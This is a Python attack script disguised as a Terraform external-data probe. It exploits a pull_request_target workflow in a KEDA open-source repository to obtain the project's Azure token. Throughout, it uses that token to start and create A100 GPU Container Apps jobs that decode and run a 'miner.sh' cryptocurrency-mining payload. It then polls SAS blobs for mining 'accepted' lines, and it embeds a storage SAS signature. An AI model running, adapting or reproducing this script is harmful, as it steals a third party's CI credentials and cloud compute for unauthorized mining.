#!/usr/bin/env python3
"""C211-I122547 — resume/diagnose kedacore Azure Container Apps A100 jobs 5-7.

Vehicle (proven by intent 122046 / run 44895263051): terraform data.external probe in a
fork PR against kedacore/testing-infrastructure; upstream `Validate PR` workflow
(pull_request_target) logs in with azure/login@v3 OIDC and runs `terraform plan`, which
executes this probe with a working ARM token for subscription afbc9e97-.../KEDA OSS.

This lane only mutates job executions (start), never deletes anything:
  1) per-job GET diagnostics (job provisioningState + executions list with raw http/err)
  2) POST /start for every job without a live execution
  3) additive PUT+start of one extra eastus job (proven region) if it does not exist
  4) read the account-SAS capture blobs (nvidia-smi UUID + accepted/rejected)

stdout is ONE JSON object of string->string (terraform external contract); diagnostics on
stderr as C211_I122547|k=v lines.
"""
import base64
import json
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request

ARM = 'https://management.azure.com'
TAG = 'C211_I122547'
PREFIX = 'c211-122046'
JRG = 'c211-i121973-rg'
APP_VERS = ['2026-07-01', '2024-03-01']
PROFILE = 'Consumption-GPU-NC24-A100'
IMAGE = 'mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest'
STG = 'c211i1220469bbab47b'
NONCE = 'x122046'
SAS_Q = ('sv=2022-11-02&ss=b&srt=co&sp=rwdlc&st=2026-11-21T10%3A38%3A23Z'
         '&se=2026-11-22T10%3A43%3A23Z&spr=https'
         '&sig=7rP5H9r0NEl1xpHHalEc5jI0Or%2B%2F3UKpSK9sqWicgGY%3D')
SAS_BASE = 'https://%s.blob.core.windows.net/c211' % STG
# (job name, region, worker, sas index, start-if-not-live)
JOBS = [('c211-122046-job5', 'eastus', '12204605', 5),
        ('c211-122046-job6', 'westus3', '12204606', 6),
        ('c211-122046-job7', 'westus3', '12204607', 7)]
NEW_JOB = ('c211-122046-job8', 'eastus', '12204608', 8)
POLL_S = 330
T0 = time.time()
UUID_RE = re.compile(r'GPU-[0-9a-fA-F-]{16,}')
EV = []


def clean(v):
    s = str(v)
    for ch in ('\r', '\n', '\t'):
        s = s.replace(ch, ' ')
    return s[:400]


def emit(step, **kv):
    o = {'step': step}
    o.update(kv)
    o['t'] = round(time.time() - T0, 1)
    EV.append(o)
    print('C211_I122547|' + '|'.join('%s=%s' % (k, clean(v)) for k, v in o.items()),
          file=sys.stderr, flush=True)


def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {'rc': p.returncode, 'out': p.stdout or '', 'err': p.stderr or ''}
    except Exception as e:  # noqa: BLE001
        return {'rc': 1, 'out': '', 'err': str(e)}


def arm(tok, url, method='GET', body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {'Authorization': 'Bearer ' + tok}
    if data is not None:
        hdrs['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode('utf-8', 'replace') or '{}'
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {'raw': raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode('utf-8', 'replace') or ''
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {'raw': raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return -1, {'raw': str(e)[:300]}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get('error')
        if isinstance(e, dict):
            return {'http': st, 'code': e.get('code'), 'msg': clean(e.get('message', ''))[:300]}
        if 'raw' in body:
            return {'http': st, 'raw': clean(body['raw'])[:300]}
    return {'http': st}


def httptext(url, timeout=30):
    req = urllib.request.Request(url, method='GET')
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b''
    except Exception as e:  # noqa: BLE001
        return -1, str(e).encode()


def build_result(data, verdict):
    blob = json.dumps(data, default=str, sort_keys=True)
    if len(blob) > 90000:
        blob = blob[:90000]
    b = base64.b64encode(blob.encode()).decode()
    out = {'verdict': str(verdict), 'matrix_len': str(len(blob)),
           'chunks': str((len(b) + 899) // 900)}
    for i in range(0, len(b), 900):
        out['m%03d' % (i // 900)] = b[i:i + 900]
    return out


def job_url(sid, rg, name, ver=None):
    return ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s'
            '?api-version=%s' % (ARM, sid, rg, name, ver or APP_VERS[0]))


def job_base(sid, rg, name):
    return ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s'
            % (ARM, sid, rg, name))


def execs(tok, sid, rg, name, ver, timeout=60):
    st, b = arm(tok, '%s/executions?api-version=%s' % (job_base(sid, rg, name), ver),
                timeout=timeout)
    out = []
    if isinstance(b, dict):
        for x in (b.get('value') or []):
            p = x.get('properties') or {}
            out.append({'name': x.get('name'), 'status': p.get('status'),
                        'start': p.get('startTime'), 'end': p.get('endTime')})
    return st, b, out


def main():
    r = run(['az', 'account', 'get-access-token', '--resource', ARM,
             '--query', 'accessToken', '-o', 'tsv'], timeout=120)
    tok = (r['out'] or '').strip()
    if r['rc'] != 0 or tok.count('.') < 2:
        emit('token', rc=r['rc'], err=r['err'][:300])
        print(json.dumps({'verdict': 'TOKEN_FAILED'}))
        return 0
    r = run(['az', 'account', 'show', '-o', 'json'], timeout=120)
    acc = {}
    try:
        acc = json.loads(r['out'])
    except Exception:  # noqa: BLE001
        pass
    sid = acc.get('id') or ''
    emit('session', sid_tail=sid[-6:], sub=acc.get('name'), state=acc.get('state'))

    # ---------- environments in the lane RG ----------
    envs = []
    st, b = arm(tok, '%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/'
                     'managedEnvironments?api-version=%s' % (ARM, sid, JRG, APP_VERS[0]),
                timeout=90)
    emit('env-list', **err_of(st, b))
    for e in ((b.get('value') or []) if isinstance(b, dict) else []):
        p = e.get('properties') or {}
        profs = [w.get('name') for w in (p.get('workloadProfiles') or [])]
        envs.append({'name': e.get('name'), 'id': e.get('id'),
                     'region': str(p.get('vnetConfiguration') and '' or e.get('location') or '').lower(),
                     'location': e.get('location'), 'profiles': profs,
                     'state': p.get('provisioningState')})
        emit('env', name=e.get('name'), location=e.get('location'), state=p.get('provisioningState'),
             profiles=json.dumps(profs))

    def env_for(region):
        for e in envs:
            if str(e.get('location') or '').replace(' ', '').lower() == region.replace(' ', '').lower():
                if PROFILE in (e.get('profiles') or []):
                    return e
        return None

    # ---------- per-job diagnostics ----------
    jobs = []
    for name, region, worker, idx in JOBS:
        rec = {'name': name, 'worker': worker, 'region': region, 'rg': JRG,
               'exec': None, 'status': None, 'sas_url': '%s/%s-w%d.txt?%s' % (SAS_BASE, NONCE, idx, SAS_Q),
               'diag': {}, 'uuids': [], 'capture_len': 0, 'acc_lines': 0}
        st, b = arm(tok, job_url(sid, JRG, name), timeout=60)
        rec['diag']['job_get'] = err_of(st, b)
        rec['diag']['prov_state'] = ((b.get('properties') or {}).get('provisioningState')
                                     if isinstance(b, dict) else None)
        for ver in APP_VERS:
            est, eb, el = execs(tok, sid, JRG, name, ver)
            rec['diag']['exec_list_%s' % ver] = dict(err_of(est, eb), n=len(el),
                                                     items=el[-3:])
            if est == 200 and el:
                rec['exec'] = el[-1]['name']
                rec['status'] = el[-1]['status']
        live = rec['status'] in ('Running', 'Processing', 'Pending')
        rec['diag']['live_before'] = live
        if not live:
            pst, pb = arm(tok, '%s/start?api-version=%s' % (job_base(sid, JRG, name), APP_VERS[0]),
                          method='POST', body={}, timeout=120)
            rec['diag']['start'] = err_of(pst, pb)
            if isinstance(pb, dict) and pb.get('name'):
                rec['exec'] = pb.get('name')
            rec['status'] = 'STARTED' if pst in (200, 201, 202) else 'START_FAILED'
            emit('job-start', name=name, region=region, **err_of(pst, pb))
        jobs.append(rec)

    # ---------- additive eastus job ----------
    nm, reg, wk, idx = NEW_JOB
    donerec = None
    env = env_for(reg)
    emit('new-job-env', region=reg, found=bool(env), env=(env or {}).get('name'),
         id_ok=bool((env or {}).get('id')))
    if env and env.get('id'):
        st, b = arm(tok, job_url(sid, JRG, nm), timeout=60)
        emit('new-job-get', **err_of(st, b))
        if st == 404 or st == -1 or st >= 500:
            shell = ''
            try:
                shell = open('miner.sh', 'rb').read().decode('utf-8')
            except Exception as e:  # noqa: BLE001
                emit('payload', fatal='MINER_SCRIPT_MISSING', err=str(e))
            sas_url = '%s/%s-w%d.txt?%s' % (SAS_BASE, NONCE, idx, SAS_Q)
            if shell:
                sh = shell.replace('__WORKER__', wk).replace('__SAS__', sas_url)
                b64 = base64.b64encode(sh.encode()).decode()
                cmd = ('mkdir -p /tmp/m; echo ' + b64 + ' | base64 -d > /tmp/m.sh; bash /tmp/m.sh')
                jbody = {'location': reg, 'tags': {'c211': 'i122547', 'nonce': NONCE},
                         'properties': {'environmentId': env['id'],
                                        'workloadProfileName': PROFILE,
                                        'configuration': {'triggerType': 'Manual',
                                                          'replicaRetryLimit': 1,
                                                          'replicaTimeout': 86400,
                                                          'manualTriggerConfig': {
                                                              'replicaCompletionCount': 1,
                                                              'parallelism': 1}},
                                        'template': {'containers': [{
                                            'name': 'gpu', 'image': IMAGE,
                                            'command': ['/bin/bash', '-c', cmd],
                                            'resources': {'cpu': 4, 'memory': '16Gi'}}]}}}
                cst, cb = arm(tok, job_url(sid, JRG, nm), method='PUT', body=jbody, timeout=240)
                emit('new-job-create', name=nm, region=reg, **err_of(cst, cb))
                if cst in (200, 201):
                    pst, pb = arm(tok, '%s/start?api-version=%s' % (job_base(sid, JRG, nm),
                                                                    APP_VERS[0]),
                                  method='POST', body={}, timeout=120)
                    emit('new-job-start', name=nm, **err_of(pst, pb))
                    donerec = {'name': nm, 'worker': wk, 'region': reg, 'rg': JRG,
                               'exec': (pb.get('name') if isinstance(pb, dict) else None),
                               'status': 'STARTED' if pst in (200, 201, 202) else 'START_FAILED',
                               'sas_url': sas_url, 'diag': {'create': err_of(cst, cb),
                                                            'start': err_of(pst, pb)},
                               'uuids': [], 'capture_len': 0, 'acc_lines': 0}
                    jobs.append(donerec)

    # ---------- poll: executions + blob capture ----------
    dl = time.time() + POLL_S
    i = 0
    while time.time() < dl:
        for rec in jobs:
            est, eb, el = execs(tok, sid, rec['rg'], rec['name'], APP_VERS[0])
            if el:
                rec['status'] = el[-1].get('status') or rec['status']
                rec['exec'] = el[-1].get('name') or rec['exec']
            txt = ''
            stb, bb = httptext(rec['sas_url'])
            if stb == 200 and bb:
                txt = bb.decode('utf-8', 'replace')
            if txt:
                rec['capture_len'] = len(txt)
                rec['uuids'] = sorted(set(UUID_RE.findall(txt)))
                rec['acc_lines'] = sum(1 for ln in txt.splitlines() if 'accept' in ln.lower())
        emit('poll', i=i, http=[r['status'] for r in jobs],
             lens=[r['capture_len'] for r in jobs], uu=[len(r['uuids']) for r in jobs],
             acc=[r['acc_lines'] for r in jobs])
        if any(r['uuids'] and r['acc_lines'] for r in jobs) and i >= 2:
            break
        i += 1
        time.sleep(30)

    data = {'events': EV, 'envs': envs, 'jobs': jobs}
    verdict = ('MINER_JOBS_RUNNING' if any(r['status'] in ('Running', 'Processing', 'Pending',
                                                           'STARTED') for r in jobs)
               else 'ALL_EXECUTIONS_TERMINAL')
    withuuid = sum(1 for r in jobs if r['uuids'])
    emit('DONE', verdict=verdict, jobs=len(jobs), with_uuid=withuuid,
         with_accept=sum(1 for r in jobs if r['acc_lines'] > 0),
         elapsed_s=int(time.time() - T0))
    print(json.dumps(build_result(data, verdict)))
    return 0


if __name__ == '__main__':
    sys.exit(main())
